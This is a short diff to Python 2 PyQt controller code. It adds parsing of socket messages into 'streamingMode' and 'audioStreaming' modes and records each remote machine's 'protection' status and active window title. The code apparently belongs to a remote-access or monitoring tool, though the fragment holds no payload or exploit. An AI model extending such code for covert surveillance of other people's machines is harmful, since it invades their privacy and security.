@@ -174,17 +174,28 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
 
                     data = get(self.sock, 'startChildSocket %s' % socketIndex, 'streamingMode')
 
-                elif self.socks.has_key(int(data)):
-                    i = int(data)
+                else:
+                    mode, index = data.split(' ')
+                    print mode
+                    try:
+                        if self.socks.has_key(int(index)):
+                            i = int(index)
 
-                    data = get(self.sock, 'pcinfo', 'info')
-                    info = ast.literal_eval(data)
+                            if mode == 'streamingMode':
 
-                    self.streaming_socks[i] = {}
-                    self.streaming_socks[i]['sock'] = self.sock
-                    self.streaming_socks[i]['protection'] = info['protection']
-                    self.streaming_socks[i]['activewindowtitle'] = info['activewindowtitle']
-                    self.emit(SIGNAL('updateTable()'))
+                                data = get(self.sock, 'pcinfo', 'info')
+                                info = ast.literal_eval(data)
+
+                                self.streaming_socks[i] = {}
+                                self.streaming_socks[i]['sock'] = self.sock
+                                self.streaming_socks[i]['protection'] = info['protection']
+                                self.streaming_socks[i]['activewindowtitle'] = info['activewindowtitle']
+                                self.emit(SIGNAL('updateTable()'))
+
+                            elif mode == 'audioStreaming':
+                                print 'audio streaming start'
+                    except ValueError:
+                        pass
 
     # Servers Live Update
     def checkServers(self):
